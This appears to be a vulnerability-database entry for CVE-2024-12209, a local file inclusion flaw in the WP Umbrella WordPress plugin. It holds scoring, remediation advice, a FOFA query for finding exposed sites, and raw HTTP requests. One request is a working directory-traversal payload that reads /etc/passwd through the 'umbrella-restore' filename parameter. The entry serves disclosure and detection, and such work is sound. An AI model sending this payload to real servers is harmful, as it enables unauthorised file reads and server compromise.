---
layout: post
cve_id: CVE-2024-12209
title: WP Umbrella Update Backup Restore & Monitoring <= 2.17.0 - Local File Inclusion
pcap: true
pcap_path: /pcaps/2024/CVE-2024-12209.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2024/CVE-2024-12209.yaml
snort2_rule: N/A
snort3_rule: N/A
author: s4e-io
severity: critical
impact: 'Unauthenticated attackers can exploit local file inclusion through the filename
  parameter in the umbrella-restore action to read arbitrary server files including
  /etc/passwd, execute PHP code, and gain complete server compromise.

  '
remediation: 'Validate and sanitize user inputs to prevent directory traversal. Use
  a whitelist approach for file paths and restrict file access to intended directories
  only.

  '
reference:
- https://github.com/RandomRobbieBF/CVE-2024-12209
- https://plugins.trac.wordpress.org/browser/wp-health/tags/v2.16.4/src/Actions/RestoreRouter.php#L45
- https://plugins.trac.wordpress.org/changeset?sfp_email=&sfph_mail=&reponame=&old=3202883%40wp-health&new=3202883%40wp-health&sfp_email=&sfph_mail=
- https://www.wordfence.com/threat-intel/vulnerabilities/id/c74ce3e8-cab9-4cc6-a1ad-1e51f7268474?source=cve
classification:
  cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
  cvss-score: 9.8
  cve-id: CVE-2024-12209
  cwe-id: CWE-98
  epss-score: 0.84517
  epss-percentile: 0.99292
metadata:
  verified: true
  max-request: 1
  vendor: wp-umbrella
  product: wp-umbrella
  framework: wordpress
  fofa-query: body="/wp-content/plugins/wp-health"
tags:
- cve
- cve2024
- wp
- wordpress
- wp-plugin
- wp-health
- lfi
- vkev
- vuln
---

## ðŸ” Vulnerability Description
The WP Umbrella: Update Backup Restore & Monitoring plugin for WordPress is vulnerable to Local File Inclusion in all versions up to, and including, 2.17.0 via the 'filename' parameter of the 'umbrella-restore' action. This makes it possible for unauthenticated attackers to include and execute arbitrary files on the server, allowing the execution of any PHP code in those files. This can be used to bypass access controls, obtain sensitive data, or achieve code execution in cases where images and other â€œsafeâ€ file types can be uploaded and included.


## ðŸŒ HTTP Request
```nohighlight
GET / HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:1.9.6.20) Gecko/ Firefox/3.6.17
Connection: close
Accept-Encoding: gzip
```

```nohighlight
GET /?umbrella-restore=1&filename=../../../../../../etc/passwd HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3.1 Safari/605.1.15
Connection: close
Accept-Encoding: gzip
```

